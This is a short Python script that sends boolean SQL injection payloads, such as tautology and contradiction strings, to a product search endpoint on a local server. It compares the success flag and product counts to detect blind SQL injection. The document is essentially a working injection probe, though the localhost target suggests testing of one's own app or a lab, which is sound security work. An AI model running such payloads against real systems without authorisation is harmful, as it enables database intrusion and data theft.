import urllib.request, urllib.parse, json

def call(k):
    url = 'http://127.0.0.1:8081/api/products/search?keyword=' + urllib.parse.quote(k)
    try:
        r = urllib.request.urlopen(url)
        j = json.loads(r.read().decode('utf-8', 'replace'))
        prods = (j.get('data') or {}).get('products')
        print('KEY=', repr(k), 'SUCCESS=', j.get('success'), 'N=', len(prods) if prods is not None else None)
    except Exception as e:
        print('KEY=', repr(k), 'ERR=', type(e).__name__, str(e)[:200])

for k in ["zzzz%'OR'1'='2'OR'0", "zzzz%'OR'1'='1'OR'1", "zzzz%'OR'2'='3'OR'0", "zzzz%'OR'2'='2'OR'1", "zzzz%'AND'1'='2'AND'0"]:
    call(k)
